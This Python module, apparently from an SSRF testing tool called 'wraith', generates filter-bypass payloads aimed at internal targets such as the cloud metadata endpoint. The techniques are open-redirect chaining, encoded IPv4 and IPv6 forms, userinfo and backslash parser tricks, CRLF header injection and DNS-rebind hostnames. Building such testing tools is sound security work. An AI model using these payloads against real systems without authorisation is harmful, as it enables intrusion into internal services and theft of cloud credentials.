"""Filter-bypass mutator engine (V0.1-CRITERIA.md #2).

Given an *internal SSRF target* (a URL such as
``http://169.254.169.254/latest/meta-data/``) and an optional *decoy* host (the
intended-trusted host a naive allowlist accepts), this module generates the
catalog of filter-bypass payload variants wraith injects at the marked injection
point:

* **Open-redirect chaining** (:func:`redirect_chain_variants`, v0.8) -- when an
  open-redirect endpoint on a trusted domain is available, embed the internal
  target URL into it (raw, URL-encoded, double-encoded). A filter that only
  checks ``startswith("trusted.com")`` passes all three; the SSRF sink follows
  the redirect to the internal host. Comes first in the ordering.
* **IP encodings** (:func:`ipv4_encodings`) -- dword-decimal, hex dotted +
  dotless, octal dotted + dotless, shorthand (``127.1`` / ``0``),
  IPv4-mapped IPv6 (``[::ffff:127.0.0.1]`` and the pure-hex
  ``[::ffff:7f00:1]``), and IPv6 loopback (``[::1]``) for a loopback target.
* **URL-structure tricks** -- userinfo ``@`` (single + multi), fragment ``#``,
  backslash ``\\``, whitespace/tab, CRLF header-injection, and malformed /
  long / case-varied scheme.
* **DNS-rebind** hostnames pointing at a public rebind service (``rbndr.us``) --
  **emit-only** per the NOT-in-v0.1 guardrail (wraith never hosts the flip).

Every encoding primitive is a pure function with an **exact-byte** result so it
can be pinned in a Tier-0 unit test (the criteria mandates this). The two
worked examples from the contract:

    127.0.0.1        -> 2130706433 / 0x7f000001 / 0177.0.0.1
    169.254.169.254  -> 2852039166 / 0xa9fea9fe

Default variant ordering (criteria #2): redirect-chain + userinfo(``@``) ->
DNS-rebind -> parser-differential -> encoding -> scheme. Redirect-chain variants
require a caller-supplied open-redirect URL; they are omitted when none is given.

R5: nothing here evaluates content; these are pure string transforms.
"""

from __future__ import annotations

import ipaddress
from dataclasses import dataclass
from urllib.parse import quote, urlsplit

__all__ = [
    "Variant",
    "to_dword",
    "to_hex_dotless",
    "to_hex_dotted",
    "to_octal_dotted",
    "to_octal_dotless",
    "to_shorthand",
    "to_ipv4_mapped_ipv6",
    "to_ipv4_mapped_ipv6_hex",
    "ipv4_encodings",
    "is_ipv4_literal",
    "rbndr_hostname",
    # v0.8: open-redirect chaining
    "redirect_chain_variants",
    "build_variants",
    "mutate",
    "IPV6_LOOPBACK",
    "IPV6_LINK_LOCAL",
    "IPV6_ULA",
]

# IPv6 internal literals emitted as alternate targets. Loopback maps a loopback
# IPv4 target to its IPv6 equivalent; link-local / ULA are representative
# internal ranges an allowlist commonly forgets to block.
IPV6_LOOPBACK = "[::1]"
IPV6_LINK_LOCAL = "[fe80::1]"
IPV6_ULA = "[fd00::1]"

# Public IP the rbndr.us rebind hostname alternates *with* (emit-only). rbndr
# flips between the two encoded labels on successive lookups; pairing the
# internal target with a benign public address is the standard rebind setup.
_REBIND_PUBLIC_IP = "1.1.1.1"


@dataclass(frozen=True, slots=True)
class Variant:
    """One filter-bypass payload variant.

    Attributes:
        name: Stable mutator id (e.g. ``"dword-decimal"``, ``"userinfo-at"``).
            Flows into the :class:`wraith.findings.Finding` ``variant`` field.
        family: Mutator family for ordering / reporting -- one of
            ``"userinfo"``, ``"dns-rebind"``, ``"parser-differential"``,
            ``"encoding"``, ``"scheme"``.
        value: The exact payload bytes to inject at the marked injection point
            (a full URL string).
        note: Short human note on the technique (optional).
    """

    name: str
    family: str
    value: str
    note: str = ""


# --------------------------------------------------------------------------- #
# IPv4 encoding primitives (pure, exact-byte -- Tier-0 pinned)
# --------------------------------------------------------------------------- #

def is_ipv4_literal(host: str) -> bool:
    """True if ``host`` is a dotted-quad IPv4 literal (not a hostname)."""
    try:
        ipaddress.IPv4Address(host)
    except (ipaddress.AddressValueError, ValueError):
        return False
    return True


def _ipv4_int(ip: str) -> int:
    return int(ipaddress.IPv4Address(ip))


def _octets(ip: str) -> list[int]:
    return [int(x) for x in str(ipaddress.IPv4Address(ip)).split(".")]


def to_dword(ip: str) -> str:
    """32-bit decimal (dword) form. ``127.0.0.1`` -> ``2130706433``.

    Doubles as the shorthand ``0`` form for ``0.0.0.0``.
    """
    return str(_ipv4_int(ip))


def to_hex_dotless(ip: str) -> str:
    """Single hex dword. ``127.0.0.1`` -> ``0x7f000001``."""
    return "0x" + format(_ipv4_int(ip), "08x")


def to_hex_dotted(ip: str) -> str:
    """Per-octet hex. ``127.0.0.1`` -> ``0x7f.0x0.0x0.0x1``."""
    return ".".join("0x" + format(o, "x") for o in _octets(ip))


def to_octal_dotted(ip: str) -> str:
    """Per-octet octal. ``127.0.0.1`` -> ``0177.0.0.1``.

    An octet >= 8 gets the leading-zero octal form (``127`` -> ``0177``); octets
    0..7 are left bare because their octal and decimal spellings are identical,
    which reproduces the contract's exact ``0177.0.0.1`` (not ``0177.00.00.01``).
    """
    parts: list[str] = []
    for o in _octets(ip):
        parts.append("0" + format(o, "o") if o >= 8 else str(o))
    return ".".join(parts)


def to_octal_dotless(ip: str) -> str:
    """Single octal dword with a leading zero. ``127.0.0.1`` -> ``017700000001``."""
    return "0" + format(_ipv4_int(ip), "o")


def to_shorthand(ip: str) -> str:
    """2-part ``A.B`` inet_aton form. ``127.0.0.1`` -> ``127.1``.

    ``A`` is the first octet; ``B`` is the remaining 24 bits as one integer.
    ``0.0.0.0`` collapses to ``0.0`` here; the bare ``0`` form is
    :func:`to_dword`.
    """
    o = _octets(ip)
    b = (o[1] << 16) | (o[2] << 8) | o[3]
    return f"{o[0]}.{b}"


def to_ipv4_mapped_ipv6(ip: str) -> str:
    """IPv4-mapped IPv6, mixed notation. ``127.0.0.1`` -> ``[::ffff:127.0.0.1]``."""
    return f"[::ffff:{str(ipaddress.IPv4Address(ip))}]"


def to_ipv4_mapped_ipv6_hex(ip: str) -> str:
    """IPv4-mapped IPv6, pure hex groups. ``127.0.0.1`` -> ``[::ffff:7f00:1]``."""
    o = _octets(ip)
    hi = (o[0] << 8) | o[1]
    lo = (o[2] << 8) | o[3]
    return f"[::ffff:{hi:x}:{lo:x}]"


def rbndr_hostname(ip: str, public_ip: str = _REBIND_PUBLIC_IP) -> str:
    """rbndr.us rebind hostname: ``<inthex>.<pubhex>.rbndr.us`` (emit-only).

    ``127.0.0.1`` + ``1.1.1.1`` -> ``7f000001.01010101.rbndr.us``. The service
    alternates resolution between the two 8-hex-digit labels; wraith emits the
    hostname as a mutator but never hosts the DNS flip (NOT-in-v0.1).
    """
    inthex = format(_ipv4_int(ip), "08x")
    pubhex = format(_ipv4_int(public_ip), "08x")
    return f"{inthex}.{pubhex}.rbndr.us"


def ipv4_encodings(ip: str) -> list[Variant]:
    """All host-encoding variants for an IPv4 literal (bare host strings)."""
    ip = str(ipaddress.IPv4Address(ip))  # validate + normalise
    out = [
        Variant("dword-decimal", "encoding", to_dword(ip), "32-bit decimal host"),
        Variant("hex-dotless", "encoding", to_hex_dotless(ip), "single hex dword"),
        Variant("hex-dotted", "encoding", to_hex_dotted(ip), "per-octet hex"),
        Variant("octal-dotted", "encoding", to_octal_dotted(ip), "per-octet octal"),
        Variant("octal-dotless", "encoding", to_octal_dotless(ip), "single octal dword"),
        Variant("shorthand", "encoding", to_shorthand(ip), "2-part inet_aton form"),
        Variant("ipv4-mapped-ipv6", "encoding", to_ipv4_mapped_ipv6(ip), "::ffff: mixed"),
        Variant("ipv4-mapped-ipv6-hex", "encoding", to_ipv4_mapped_ipv6_hex(ip), "::ffff: hex"),
    ]
    if ipaddress.IPv4Address(ip).is_loopback:
        out.append(Variant("ipv6-loopback", "encoding", IPV6_LOOPBACK, "IPv6 loopback"))
    return out


# --------------------------------------------------------------------------- #
# Open-redirect chaining (v0.8)
# --------------------------------------------------------------------------- #

def redirect_chain_variants(
    internal_url: str,
    redirect_url: str,
    *,
    marker: str = "FUZZ",
) -> list[Variant]:
    """Open-redirect chaining variants for bypassing trusted-domain allowlists.

    Given an open-redirect endpoint on a trusted domain (``redirect_url``, with
    ``marker`` where the destination is inserted) and an internal SSRF target
    (``internal_url``), embeds the internal URL into the redirect parameter in
    three encodings:

    * ``redirect-chain-raw``: internal URL verbatim -- for redirectors that
      pass the value through unchanged.
    * ``redirect-chain-enc``: single URL-encoded internal URL -- for redirectors
      that call ``urllib.parse.unquote()`` once before following.
    * ``redirect-chain-double-enc``: double-encoded -- for redirectors that
      decode twice, or for WAFs that only inspect the outer (first) encoding
      layer.

    A filter that only tests whether the injected URL belongs to the trusted
    domain (``startswith("https://trusted.com")`` or a hostname allowlist) will
    pass all three; the SSRF sink follows the redirect to the internal host.

    Args:
        internal_url: Internal SSRF destination to embed as the redirect target,
            e.g. ``http://169.254.169.254/latest/meta-data/``.
        redirect_url: Open-redirect endpoint template with ``marker`` at the
            position where the destination URL is inserted, e.g.
            ``https://trusted.com/redirect?url=FUZZ``.
        marker: Token in ``redirect_url`` to replace with the internal URL
            (default: ``"FUZZ"``).

    Returns:
        Three :class:`Variant` objects in the ``"redirect-chain"`` family,
        ordered raw → encoded → double-encoded.

    Example::

        variants = redirect_chain_variants(
            "http://169.254.169.254/latest/meta-data/",
            "https://trusted.com/redir?next=FUZZ",
        )
        # Produces:
        #   redirect-chain-raw:        https://trusted.com/redir?next=http://169.254...
        #   redirect-chain-enc:        https://trusted.com/redir?next=http%3A%2F%2F169...
        #   redirect-chain-double-enc: https://trusted.com/redir?next=http%253A%252F%252F169...

    R5: ``internal_url`` is a caller-supplied URL string; the output is a
    direct string substitution, never evaluated.
    """
    encoded = quote(internal_url, safe="")
    double_enc = quote(encoded, safe="")
    return [
        Variant(
            "redirect-chain-raw",
            "redirect-chain",
            redirect_url.replace(marker, internal_url),
            "open redirect: raw internal URL embedded (filter sees trusted domain)",
        ),
        Variant(
            "redirect-chain-enc",
            "redirect-chain",
            redirect_url.replace(marker, encoded),
            "open redirect: URL-encoded internal URL (one decode pass)",
        ),
        Variant(
            "redirect-chain-double-enc",
            "redirect-chain",
            redirect_url.replace(marker, double_enc),
            "open redirect: double-encoded internal URL (two decode passes / WAF bypass)",
        ),
    ]


# --------------------------------------------------------------------------- #
# URL decomposition + full-catalog builder
# --------------------------------------------------------------------------- #

def _split_target(internal_url: str) -> tuple[str, str, int | None, str]:
    """Return ``(scheme, host, port, tail)`` for an internal SSRF URL.

    ``tail`` is the path + query (leading ``/`` guaranteed). IPv6 hosts keep
    their brackets. A bare ``host`` or ``host/path`` (no scheme) is accepted and
    defaults to the ``http`` scheme.
    """
    raw = internal_url.strip()
    candidate = raw if "://" in raw else "http://" + raw
    parts = urlsplit(candidate)
    scheme = parts.scheme or "http"
    host = parts.hostname or ""
    # Re-bracket an IPv6 literal that urlsplit stripped.
    if host and ":" in host and not host.startswith("["):
        host = f"[{host}]"
    port = parts.port
    tail = parts.path or "/"
    if parts.query:
        tail += "?" + parts.query
    return scheme, host, port, tail


def _hostport(host: str, port: int | None) -> str:
    return host if port is None else f"{host}:{port}"


def build_variants(
    internal_url: str,
    *,
    decoy: str = "localhost",
    redirect_url: str | None = None,
    redirect_marker: str = "FUZZ",
) -> list[Variant]:
    """Build the ordered filter-bypass variant catalog for one internal target.

    Args:
        internal_url: The internal SSRF destination (URL or bare host), e.g.
            ``http://169.254.169.254/latest/meta-data/``.
        decoy: The intended-trusted host used in the ``@`` / ``#`` / ``\\``
            tricks (the host a naive allowlist accepts).
        redirect_url: Optional open-redirect endpoint template (v0.8). When
            provided, three ``redirect-chain`` variants are prepended -- the
            highest-priority bypass class (criteria #2 ordering: redirect-chain
            + ``@`` → DNS-rebind → parser-differential → encoding → scheme).
            Use ``redirect_marker`` to set the substitution token in the
            template (default ``"FUZZ"``).
        redirect_marker: Token in ``redirect_url`` that is replaced with the
            internal URL when generating redirect-chain variants (default:
            ``"FUZZ"``).

    Returns:
        Variants in the criteria's default order: [redirect-chain ->]
        userinfo(``@``) -> DNS-rebind -> parser-differential -> encoding ->
        scheme. Every ``value`` is a full URL string ready to inject at the
        marked injection point. Redirect-chain variants are only included when
        ``redirect_url`` is provided.
    """
    scheme, host, port, tail = _split_target(internal_url)
    hp = _hostport(host, port)
    variants: list[Variant] = []

    # 0) Redirect chain (v0.8) -- highest bypass priority: embed the internal
    #    URL in a trusted-domain open redirect. A filter that only checks the
    #    outer URL's domain passes it; the sink follows the redirect internally.
    if redirect_url is not None:
        variants.extend(
            redirect_chain_variants(internal_url, redirect_url, marker=redirect_marker)
        )

    # 1) userinfo (@) -- strongest allowlist bypass: decoy is userinfo, the real
    #    host is the internal target.
    variants.append(
        Variant("userinfo-at", "userinfo", f"{scheme}://{decoy}@{hp}{tail}",
                "decoy as userinfo; real host is internal")
    )
    variants.append(
        Variant("userinfo-at-multi", "userinfo", f"{scheme}://{decoy}@{decoy}@{hp}{tail}",
                "multi-@ parser split")
    )

    # 2) DNS-rebind (OOB) -- emit-only rebind hostname (IPv4 target only).
    if is_ipv4_literal(host):
        variants.append(
            Variant("dns-rebind-rbndr", "dns-rebind", f"{scheme}://{rbndr_hostname(host)}{tail}",
                    "public rebind service hostname; emit-only")
        )

    # 3) parser-differential -- fragment / backslash / whitespace / CRLF.
    variants.append(
        Variant("fragment-hash", "parser-differential", f"{scheme}://{hp}{tail}#@{decoy}",
                "decoy hidden in fragment; strict parser hits internal")
    )
    variants.append(
        Variant("backslash", "parser-differential", f"{scheme}://{decoy}\\@{hp}{tail}",
                "backslash treated as path by some parsers")
    )
    variants.append(
        Variant("whitespace-tab", "parser-differential", f"{scheme}://{decoy}%09@{hp}{tail}",
                "encoded tab truncates host in some parsers")
    )
    variants.append(
        Variant("crlf-header-injection", "parser-differential",
                f"{scheme}://{hp}{tail}%0d%0aWraith-Canary:%201",
                "CRLF to inject a header into the server's outbound request")
    )

    # 4) encoding -- IPv4 host re-encodings (IPv4 literal target only).
    if is_ipv4_literal(host):
        for enc in ipv4_encodings(host):
            enc_hp = _hostport(enc.value, port)
            variants.append(
                Variant(enc.name, "encoding", f"{scheme}://{enc_hp}{tail}", enc.note)
            )

    # 5) scheme -- case-varied + malformed slash.
    variants.append(
        Variant("scheme-case", "scheme", f"{_alt_case(scheme)}://{hp}{tail}",
                "case-varied scheme")
    )
    variants.append(
        Variant("scheme-backslash", "scheme", f"{scheme}:/\\/{hp}{tail}",
                "malformed scheme separator")
    )

    return variants


def _alt_case(scheme: str) -> str:
    """Alternate the case of a scheme: ``http`` -> ``HtTp``."""
    return "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(scheme))


# Alias matching the criteria's vocabulary ("mutate the seed").
mutate = build_variants
